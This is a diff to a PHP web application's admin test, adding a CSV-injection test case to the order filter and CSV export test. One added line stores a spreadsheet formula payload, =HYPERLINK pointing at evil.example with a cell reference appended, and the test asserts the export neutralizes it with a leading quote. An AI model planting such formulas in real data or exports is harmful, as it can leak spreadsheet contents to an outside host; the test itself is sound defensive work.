@@ -110,6 +110,8 @@ final class AdminTest extends WebTestCase
     public function testFiltersAndCsvExport(): void
     {
         $match = $this->factory->order('+3 days', email: 'match@example.com');
+        $match->setDescription('=HYPERLINK("http://evil.example/?"&A1,"x")');
+        $this->em->flush();
         $this->factory->order('+3 days', status: OrderStatus::CANCELLED, email: 'cancelled@example.com');
         $this->client->loginUser($this->factory->admin());
 
@@ -123,6 +125,7 @@ final class AdminTest extends WebTestCase
         self::assertResponseHeaderSame('Content-Type', 'text/csv; charset=UTF-8');
         self::assertStringContainsString($match->getReference(), (string) $csv);
         self::assertStringNotContainsString('cancelled@example.com', (string) $csv);
+        self::assertStringContainsString("'=HYPERLINK", (string) $csv, 'Formulas are neutralized for Excel');
     }
 
     public function testAdminCannotDeleteThemselves(): void
